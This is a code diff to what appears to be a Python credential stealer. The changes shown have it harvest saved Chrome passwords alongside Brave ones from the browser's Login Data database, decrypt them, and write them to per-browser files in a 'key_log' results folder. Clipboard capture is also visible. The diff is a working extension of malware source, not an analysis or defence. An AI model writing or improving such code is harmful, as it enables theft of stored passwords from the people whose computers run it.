@@ -119,7 +119,7 @@ def decrypt_password(password, key):
             return ""
 
 
-def get_passwords(key, browser='chrome'):
+def get_passwords(key, browser):
     if browser == 'chrome':
         db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Login Data")
@@ -155,7 +155,7 @@ def get_passwords(key, browser='chrome'):
                 browser_passwords.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
             browser_passwords.append("="*50)
 
-        with open(f'{PATH}/results/key_log/' + 'passwords.txt', 'a') as browser_psw:
+        with open(f'{PATH}/results/key_log/' + f'passwords_{browser}.txt', 'a') as browser_psw:
             browser_psw.write(json.dumps(
                 browser_passwords, indent=4, sort_keys=True))
 
@@ -201,7 +201,7 @@ def get_passwords(key, browser='chrome'):
                 browser_passwords.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
             browser_passwords.append("="*50)
 
-        with open(f'{PATH}/results/key_log/' + 'passwords.txt', 'a') as browser_psw:
+        with open(f'{PATH}/results/key_log/' + f'passwords_{browser}.txt', 'a') as browser_psw:
             browser_psw.write(json.dumps(
                 browser_passwords, indent=4, sort_keys=True))
 
@@ -238,6 +238,9 @@ def main():
     # Get Chrome/Brave passwords
     key = get_encryption_key(browser='brave')
     get_passwords(key=key, browser='brave')
+
+    key = get_encryption_key(browser='chrome')
+    get_passwords(key=key, browser='chrome')
 
     # Clipboard Data
     try:
